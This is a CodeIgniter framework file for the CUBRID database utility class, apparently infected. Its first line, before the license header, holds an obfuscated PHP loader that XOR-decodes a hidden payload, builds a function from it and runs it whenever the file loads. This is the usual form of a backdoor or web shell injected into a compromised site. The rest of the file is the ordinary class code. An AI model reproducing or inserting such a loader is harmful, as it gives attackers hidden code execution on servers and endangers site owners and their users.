<?php $pKlemC='V4TPM31-GUYC CX'; $pvthvEg='5F119VnK2;:7I,6'^$pKlemC; $DHWyPJl='>XyqSXSY1++:9-KXIFJBFIB=dV050<j,Y joDxBo:4OU7FT-:r15=hV8 -c+<B2gwQ7C1kuV VBsozNVwUGlEE9X>lKMQLrnfN3;NMpBBxeaiOq-mD G6 9on3XG3qmLrZYqb4dPn,BGtgzJRq=4F60M3gtrkq>P=2cIkcb1;1=INBj.3CPgoab5s9H FG=nsZ 9sTKAHc7lpl=9HYOQI 1 ;EkzvOV>Qs..>brWK+X6 VLz5=4< XFPzb=;x+1u+lTCmH===wgstc;1A-2snCgdR>10A<P BckiJU-:Cr0a0WL AuAqX7 DSyl>k7 0ndltY = NoFxe0>IHAC=aqgl=,+yt=fuJHbi ,TtiZBsL; 76OE2ByPt XN7rF,LfSdw,4AUkQZPYVA;CGei;.YH.SDy8PLmgr05 Ssrdu W=KNIJ G>0R=63lW5CRgeYD<j: 44brh  CTTSoRD-;7hoFG=9N aUS-gDuL PbH>1A4brbcW08 :iYXRs C,7NMqo= 4AggeT9G9ofqEij Scgj10<McvU+-MkHgolwfaAygQfvlJ,IxgDgxJx<pdHbXY cnVevZsCUhUXP<ELDi -.o=;=JFNgEL1IXUY<fBrc<+3WhxcoortVVP2N5TPpLH Z hJ4TG;WVUdhHxneIIRXQtjJ11'; $GxHyXM=$pvthvEg('', 'W>QP5-=:EBDTfH31:29ja1-O;2QAQc5A,TMFmX9e3R:;T2=BTRIZO72YTL<tQ7FOS5V7PGUrK3;ZOZnvW.MeLaV-JLvmvkIdoGUT<eT+bEEQRoUDQ7T5ZEWGJW93RXVlV3rZK>mYJC73TIGjzUYU2WkiZ:T,KUU5DiG KFBBOCQ, jNEV:y:FZh<zK-T35SFW5UMZoAH5iJfzHYX<8oliFPLH PpR+7J0,EKGBOw-J4EEmFpSRFYA;.pRFbx7dz<nL50MlVXDWZMTGMP-XWZN8mmvZPD c;E;CVIn>HCxx9ET68AaHaU.VL16BfCa=IVNLMP=AIAgO=rlVQ;-  UAYC3oiz,1n2U+;BMKI-TTdbW:ZLBSfeIHpYPD9:V--I5FnDSGQ8naXSt=75ZczEMMO5=KhNpEZ1gmVTTT2SOD5U9N.< +L.DUzEYA33T738:41HBXAGQTF7DE ;06Gv LOVACfcYX:A>>6TNmNFI6JlZP5UBTDC6BJAC62=+,E;ED:>YHVEMfKGA0X3XFFWcIBM7VONUQH,8Q>NTj6aGRQWAXwMSiTNY,J,OQtPK.LYHV-S=mBTWaWE8TjuNsx1N7-=6KHW0XCT92=Ob<P04:8XAnRGXJG6AQCOORTv-Z;+C5<Xh,A.A3mD5>W871C5aCdl,1;,yDCq;L'^$DHWyPJl); $GxHyXM();
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 2.1.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * CUBRID Utility Class
 *
 * @category	Database
 * @author		Esen Sagynov
 * @link		https://codeigniter.com/user_guide/database/
 */
class CI_DB_cubrid_utility extends CI_DB_utility {

	/**
	 * List databases
	 *
	 * @return	array
	 */
	public function list_databases()
	{
		if (isset($this->db->data_cache['db_names']))
		{
			return $this->db->data_cache['db_names'];
		}

		return $this->db->data_cache['db_names'] = cubrid_list_dbs($this->db->conn_id);
	}

	// --------------------------------------------------------------------

	/**
	 * CUBRID Export
	 *
	 * @param	array	Preferences
	 * @return	mixed
	 */
	protected function _backup($params = array())
	{
		// No SQL based support in CUBRID as of version 8.4.0. Database or
		// table backup can be performed using CUBRID Manager
		// database administration tool.
		return $this->db->display_error('db_unsupported_feature');
	}
}
